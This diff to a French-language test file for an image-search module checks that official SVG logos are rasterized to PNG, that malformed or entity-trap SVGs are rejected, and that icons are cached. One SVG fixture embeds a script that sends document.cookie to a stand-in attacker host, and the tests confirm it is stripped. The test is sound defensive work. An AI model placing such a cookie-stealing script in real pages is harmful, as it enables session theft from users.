@@ -36,8 +36,10 @@ vi.mock("@/modules/clip-studio/lib/store", async () => {
 import { ASSETS_DIR } from "@/modules/clip-studio/lib/store";
 import {
   FOUND_DIR,
+  downloadIcon,
   findSegmentIcon,
   findSegmentImage,
+  iconCacheKey,
   iconSearchPrompt,
   importFoundImageById,
   pickBest,
@@ -94,7 +96,10 @@ describe("icônes : consigne de recherche", () => {
     expect(prompt).toContain("App Store");
     expect(prompt).toContain("logo détouré");
     expect(prompt).toContain("PNG transparent");
-    expect(prompt).toMatch(/jamais un SVG/);
+    // Un logo officiel en SVG est bienvenu : le serveur le nettoie et le rastérise.
+    expect(prompt).toContain("SVG officiel");
+    expect(prompt).toContain("upload.wikimedia.org");
+    expect(prompt).not.toMatch(/jamais un SVG/);
     expect(prompt).toContain("DONNÉE");
     // Le sujet ne peut pas refermer la balise qui l'encadre.
     expect(prompt.match(/<\/sujet>/g)).toHaveLength(2);
@@ -111,7 +116,7 @@ describe("icônes : consigne de recherche", () => {
 });
 
 describe("icônes : recherche web", () => {
-  it("accepte une petite icône carrée et un PNG transparent, refuse un SVG", async () => {
+  it("accepte une petite icône carrée et un PNG transparent, refuse un SVG vide", async () => {
     const codex = fakeCodex(
       webAnswer(
         { imageUrl: "https://cdn.example.com/icon.png", pageUrl: "https://store.example.com/app", title: "Icône de l'appli" },
@@ -151,6 +156,128 @@ describe("icônes : recherche web", () => {
     const imported = await importFoundImageById(found.id);
     expect(imported).toMatchObject({ kind: "icon", rights: "unverified", width: 256, height: 256, credit: "Icône Genshin, Droits à vérifier, https://store.example.com/app" });
     expect(fs.existsSync(path.join(ASSETS_DIR, imported.file))).toBe(true);
+  });
+});
+
+/** Logo officiel en SVG : une pastille ronde et une barre, en classes CSS, sur fond transparent. */
+const SVG_LOGO = Buffer.from(
+  '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 100">' +
+    "<style>.dot{fill:#5865f2}.bar{fill:#23272a}</style>" +
+    '<circle class="dot" cx="50" cy="50" r="45"/><rect class="bar" x="120" y="35" width="170" height="30" rx="15"/>' +
+    '<script>fetch("https://evil.example/" + document.cookie)</script></svg>'
+);
+
+function fakeSvg(files: Record<string, Buffer>) {
+  return vi.fn(async (url: string) => {
+    const file = files[url];
+    if (!file) throw new Error("Le site a répondu HTTP 404");
+    return { b64: file.toString("base64"), mimeType: "image/svg+xml", name: "logo.svg" };
+  });
+}
+
+describe("icônes : logos officiels en SVG", () => {
+  it("un SVG officiel devient un PNG transparent de 512 px, script retiré", async () => {
+    const image = await downloadIcon("https://brand.example.com/logo.svg", { fetchImage: fakeSvg({ "https://brand.example.com/logo.svg": SVG_LOGO }) });
+    expect(image).toMatchObject({ format: "png", extension: "png", width: 512, height: 171 });
+    const metadata = await sharp(image.buffer).metadata();
+    expect(metadata).toMatchObject({ format: "png", hasAlpha: true });
+    // Coin transparent, centre de la pastille plein.
+    const { data, info } = await sharp(image.buffer).raw().toBuffer({ resolveWithObject: true });
+    expect(data[3]).toBe(0);
+    expect(data[(85 * info.width + 85) * 4 + 3]).toBe(255);
+  });
+
+  it("la recherche web garde le SVG rastérisé, avec sa page source et ses droits", async () => {
+    const codex = fakeCodex(webAnswer({ imageUrl: "https://upload.wikimedia.org/logo.svg", pageUrl: "https://commons.wikimedia.org/wiki/File:Logo.svg", title: "Logo officiel" }));
+    const fetchImage = fakeSvg({ "https://upload.wikimedia.org/logo.svg": SVG_LOGO });
+    const [found] = await searchWeb("Brand", undefined, { askCodex: codex.ask, findCodex: () => "codex", fetchImage }, "icon");
+    expect(found.found).toMatchObject({ kind: "icon", rights: "unverified", width: 512, height: 171, sourcePage: "https://commons.wikimedia.org/wiki/File:Logo.svg" });
+    expect(found.found.thumbnail).toMatch(/\/found\/web-[a-f0-9]{16}\.png$/);
+    const imported = await importFoundImageById(found.found.id);
+    expect(imported.file).toMatch(/\.png$/);
+    expect(imported.credit).toBe("Logo officiel, Droits à vérifier, https://commons.wikimedia.org/wiki/File:Logo.svg");
+    // Le fichier gardé est un PNG : aucune trace du SVG ni de son script.
+    const kept = fs.readFileSync(path.join(ASSETS_DIR, imported.file));
+    expect((await sharp(kept).metadata()).format).toBe("png");
+    expect(kept.includes("script")).toBe(false);
+  });
+
+  it("une illustration n'accepte toujours pas de SVG", async () => {
+    const codex = fakeCodex(webAnswer({ imageUrl: "https://brand.example.com/logo.svg" }));
+    const fetchImage = fakeSvg({ "https://brand.example.com/logo.svg": SVG_LOGO });
+    expect(await searchWeb("Brand", undefined, { askCodex: codex.ask, findCodex: () => "codex", fetchImage })).toEqual([]);
+  });
+
+  it("un SVG piégé ou invalide est simplement écarté", async () => {
+    const codex = fakeCodex(
+      webAnswer({ imageUrl: "https://brand.example.com/laughs.svg" }, { imageUrl: "https://brand.example.com/broken.svg" }, { imageUrl: "https://brand.example.com/logo.svg" })
+    );
+    const fetchImage = fakeSvg({
+      "https://brand.example.com/laughs.svg": Buffer.from('<!DOCTYPE svg [<!ENTITY a "aaaa">]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 9 9"><text>&a;</text></svg>'),
+      "https://brand.example.com/broken.svg": Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect'),
+      "https://brand.example.com/logo.svg": SVG_LOGO,
+    });
+    const results = await searchWeb("Brand", undefined, { askCodex: codex.ask, findCodex: () => "codex", fetchImage }, "icon");
+    expect(results).toHaveLength(1);
+    expect(results[0].imageUrl).toBe("https://brand.example.com/logo.svg");
+  });
+});
+
+describe("icônes : cache", () => {
+  it("normalise le sujet : accents, casse et ponctuation ne comptent pas", () => {
+    expect(iconCacheKey("Pokémon GO – Logo!")).toBe("pokemon go logo");
+    expect(iconCacheKey("  pokemon   go logo ")).toBe("pokemon go logo");
+  });
+
+  it("un logo reconnu pour un sujet n'est ni recherché ni téléchargé une seconde fois", async () => {
+    const codex = fakeCodex(webAnswer({ imageUrl: "https://brand.example.com/logo.svg", pageUrl: "https://brand.example.com/press", title: "Logo Brand" }), '{"choice": 1}');
+    const fetchImage = fakeSvg({ "https://brand.example.com/logo.svg": SVG_LOGO });
+    const deps = { askCodex: codex.ask, findCodex: () => "codex", fetchImage };
+    const first = await findSegmentIcon({ query: "Brand logo", text: "Brand" }, deps);
+    expect(first?.image).toMatchObject({ kind: "icon", width: 512 });
+    expect(codex.ask).toHaveBeenCalledTimes(2);
+    expect(fetchImage).toHaveBeenCalledTimes(1);
+
+    // Même sujet, écrit autrement, dans un autre projet : repris des médias du module.
+    const second = await findSegmentIcon({ query: "brand  LOGO", text: "Encore Brand" }, deps);
+    expect(second).toEqual(first);
+    expect(codex.ask).toHaveBeenCalledTimes(2);
+    expect(fetchImage).toHaveBeenCalledTimes(1);
+    const assets = JSON.parse(fs.readFileSync(path.join(path.dirname(ASSETS_DIR), "assets.json"), "utf-8"));
+    expect(assets).toHaveLength(1);
+    expect(assets[0]).toMatchObject({ foundKind: "icon", sourceUrl: "https://brand.example.com/logo.svg", foundQueries: ["brand logo"] });
+  });
+
+  it("une adresse déjà importée n'est pas retéléchargée, et l'import retombe sur le même média", async () => {
+    const codex = fakeCodex(
+      webAnswer({ imageUrl: "https://brand.example.com/logo.svg", title: "Logo Brand" }),
+      '{"choice": 1}',
+      webAnswer({ imageUrl: "https://brand.example.com/logo.svg", title: "Logo Brand" }),
+      '{"choice": 1}'
+    );
+    const fetchImage = fakeSvg({ "https://brand.example.com/logo.svg": SVG_LOGO });
+    const deps = { askCodex: codex.ask, findCodex: () => "codex", fetchImage };
+    const first = await findSegmentIcon({ query: "Brand logo", text: "Brand" }, deps);
+    // Les candidates du web expirent : seule la copie dans les médias reste.
+    fs.rmSync(FOUND_DIR, { recursive: true, force: true });
+    const other = await findSegmentIcon({ query: "Brand app icon", text: "Brand" }, deps);
+    expect(fetchImage).toHaveBeenCalledTimes(1);
+    expect(other?.image.file).toBe(first?.image.file);
+    const assets = JSON.parse(fs.readFileSync(path.join(path.dirname(ASSETS_DIR), "assets.json"), "utf-8"));
+    expect(assets).toHaveLength(1);
+    expect(assets[0].foundQueries).toEqual(["brand logo", "brand app icon"]);
+  });
+
+  it("un média effacé n'est plus repris : la recherche repart", async () => {
+    const codex = fakeCodex(webAnswer({ imageUrl: "https://brand.example.com/logo.svg" }), '{"choice": 1}', webAnswer({ imageUrl: "https://brand.example.com/logo.svg" }), '{"choice": 1}');
+    const fetchImage = fakeSvg({ "https://brand.example.com/logo.svg": SVG_LOGO });
+    const deps = { askCodex: codex.ask, findCodex: () => "codex", fetchImage };
+    const first = await findSegmentIcon({ query: "Brand logo", text: "Brand" }, deps);
+    fs.rmSync(path.join(ASSETS_DIR, first!.image.file));
+    fs.rmSync(FOUND_DIR, { recursive: true, force: true });
+    const again = await findSegmentIcon({ query: "Brand logo", text: "Brand" }, deps);
+    expect(again?.image.file).not.toBe(first?.image.file);
+    expect(fetchImage).toHaveBeenCalledTimes(2);
   });
 });
 
